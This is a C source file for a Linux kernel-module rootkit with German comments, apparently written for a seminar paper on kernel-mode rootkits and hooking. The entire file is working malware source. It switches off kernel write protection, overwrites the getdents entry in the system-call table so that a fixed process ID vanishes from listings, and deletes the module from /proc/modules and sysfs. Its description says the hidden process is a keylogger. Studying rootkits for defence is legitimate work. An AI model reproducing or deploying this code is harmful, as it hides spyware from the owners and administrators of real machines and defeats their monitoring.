// Ein LKM-Rootkit, welches eine Prozess-ID und sich selbst verbirgt
// Dieses Programm wurde für die Seminararbeit "Kernel-Mode-Rootkits und Hooking-Methoden" entwickelt
// @author Michael Küchenmeister
// @version 06/2020

#include <linux/init.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h>

// Modul Informationen, mit modinfo anzeigen
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Hide Keylogger Prozess");
MODULE_VERSION("1.0");

// Hier wird die Adresse der System-Call-Tabelle gespeichert
unsigned long **SYS_CALL_TABLE;

// Schreibschutz der System-Call-Tabelle aufheben
void EnablePageWriting(void){
  write_cr0(read_cr0() & (~0x10000));
} 

// Schreibschutz der System-Call-Tabelle setzen
void DisablePageWriting(void){
  write_cr0(read_cr0() | 0x10000);
} 

// Verzeichnis Struktur
struct linux_dirent {
  unsigned long d_ino; // inode nummer der Inode-Tabelle
  unsigned long	d_off; // Die Distanz vom aktuellen Eintrag zum nächsten
  unsigned short d_reclen; // Die Länge des Eintrags
  char d_name[]; // Dateiname, der mit NULL-BYTE terminiert
}; // dirp = directory pointer (Verzeichnisszeiger)


char HidePID[]= "5033"; // Hier wird die zu verbergende Prozess-ID gespeichert

// Originale getdents Funktionsadresse speichern
asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 

// Gehookte getdents Funktion, die den Prozess vor dem Programm (ps aux) verbrigt
asmlinkage int hookedGetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
  
  // Neue linux_dirent Variablen anlegen
  struct linux_dirent *kopieVerzeichnis = NULL, *dirp3 = NULL;

  // Variablen für die Byteberechnung anlegen
  int bytesGes = 0, verbleibendeBytes = 0, laenge = 0;

  // Gesamtanzahl der Bytes aller ermittelten Verzeichniseinträge speichern
  bytesGes = (*original_getdents) (fd, dirp, count);

  // Ein Fehler ist unterlaufen, das Verzeichnis ist leer
  if (bytesGes <= 0){
    return bytesGes;
  }

  // Speicher für ein neues Verzeichnis in der Größe von bytesGes anfordern, um das gesamte Struktur-Verzeichnis
  // in diese Variable zu kopieren, damit darüber iteriert werden kann, um die jeweilige benötigte Datei zu finden
  kopieVerzeichnis = (struct linux_dirent *) kmalloc(bytesGes, GFP_KERNEL);

  // Kopiert die Struktur-Daten vom User-Space (dirp) in den Kernel-Space (kopieVerzeichnis) der Größe bytesGes
  copy_from_user(kopieVerzeichnis, dirp, bytesGes);

  dirp3 = kopieVerzeichnis;
  verbleibendeBytes = bytesGes;
  
  while(verbleibendeBytes > 0){
    // Die Länge eines Verzeichnisseintrages ermitteln
    laenge = dirp3->d_reclen;
    // Die Länge der des Verzeichniseintrages wird wiederkehrend von der Gesamtanzahl der Bytes subtrahiert
    verbleibendeBytes -= dirp3->d_reclen;

   // Wenn der Name des aktuellen Eintrags unserer PID entspricht
   if(strcmp( (dirp3->d_name) , HidePID ) == 0){
     // Kopiere in den aktuellen Verzeichniseintrag, den nächsten Verzeichniseintrag, um den aktuellen Eintrag zu
     // überschreiben und ihn somit zu löschen
     memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, verbleibendeBytes);
     // Subtrahieren der Länge des Eintrags von der Gesamtlänge aller Einträge, damit die Gesamtanzahl
     // der Bytes nach dem Löschen des Eintrages wieder stimmt
     bytesGes -= laenge; 
    }

    // Adresse aktueller Eintrag + Länge aktueller Eintrag = Adresse nächster Eintrag
    dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);
  }
  // Kopiert die Struktur-Daten vom Kernel-Space (kopieVerzeichnis) in den User-Space (dirp) mit insgesamt Gesamtanzahl der Bytes
  copy_to_user(dirp, kopieVerzeichnis, bytesGes);
  // Speicher, der für unsere Verzeichniskopie alloziiert wurde wieder frei geben
  kfree(kopieVerzeichnis);
  // Rückgabe der verbleiben Bytes
  return bytesGes;
}

static int __init SetHooks(void) {
  // Löscht das Modul aus procfs (Datei aller Module: cat /proc/modules)
  list_del_init(&__this_module.list);
  
  // Löscht das Modul aus sysfs (Verzeichnis aller Module: ls /sys/module)
  kobject_del(&__this_module.mkobj.kobj);  

  // Adresse der System-Call-Tabelle auslesen
  SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table");
  
  // Schreibschutz aufheben
  EnablePageWriting();
  
  // Originale Adresse des System-Calls getdents speichern
  original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];

  // Funktionsadresse von getdents-Funktion mit der gehookten Funktionsadresse in der System-Call-Tabelle überschreiben
  SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)hookedGetdents;

  // Schreibschnutz wieder einschalten
  DisablePageWriting();

  return 0;
}

// Cleanup-Routine, welche das Modul wieder aus dem Kernel entfernt (Befehl: rmmod modulname)
static void __exit HookCleanup(void) {
  // Schreibschutz aufheben
  EnablePageWriting();

  // Originale Funktionsadresse von getdents-Funktion wieder in die System-Call-Tabelle schreiben
  SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;

  // Schreibschutz wieder einschalten
  DisablePageWriting();
}

module_init(SetHooks);
module_exit(HookCleanup);

